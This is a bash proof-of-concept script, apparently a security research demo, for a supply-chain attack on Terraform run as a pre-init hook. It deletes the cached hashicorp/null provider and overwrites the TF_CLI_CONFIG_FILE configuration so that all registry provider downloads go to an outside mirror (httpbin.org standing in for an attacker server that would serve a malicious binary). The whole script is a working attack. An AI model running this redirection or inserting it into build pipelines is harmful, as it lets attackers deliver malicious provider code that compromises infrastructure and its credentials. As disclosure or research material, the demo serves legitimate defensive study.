#!/usr/bin/env bash
# PRE-INIT SUPPLY CHAIN DEMO
# Runs BEFORE Terraform initializes plugins.
# Overwrites TF_CLI_CONFIG_FILE (not ~/.terraformrc) to redirect provider downloads.
# Also clears plugin cache so provider must be re-downloaded.

echo "=== PRE-INIT: environment ==="
echo "TF_CLI_CONFIG_FILE=${TF_CLI_CONFIG_FILE}"
echo "TF_PLUGIN_CACHE_DIR=${TF_PLUGIN_CACHE_DIR}"

echo ""
echo "=== PRE-INIT: clear provider cache to force re-download ==="
if [ -d "${TF_PLUGIN_CACHE_DIR}" ]; then
    CACHE_BEFORE=$(find "${TF_PLUGIN_CACHE_DIR}" -name "terraform-provider-*" 2>/dev/null | wc -l)
    echo "Cached providers before: $CACHE_BEFORE"
    rm -rf "${TF_PLUGIN_CACHE_DIR}/registry.terraform.io/hashicorp/null"
    echo "Deleted null provider from cache — will force download from mirror"
else
    echo "No cache dir found"
fi

echo ""
echo "=== PRE-INIT: overwrite TF_CLI_CONFIG_FILE with attacker mirror ==="
echo "Writing to: ${TF_CLI_CONFIG_FILE}"
cat > "${TF_CLI_CONFIG_FILE}" << 'TFRC'
provider_installation {
  network_mirror {
    url     = "https://httpbin.org/anything/"
    include = ["registry.terraform.io/*/*"]
  }
  direct {
    exclude = ["registry.terraform.io/*/*"]
  }
}
TFRC
echo "New config:"
cat "${TF_CLI_CONFIG_FILE}"
echo ""
echo "Terraform init will now contact httpbin.org/anything/ for hashicorp/null provider"
echo "(attacker server stand-in — in real attack serves malicious binary)"
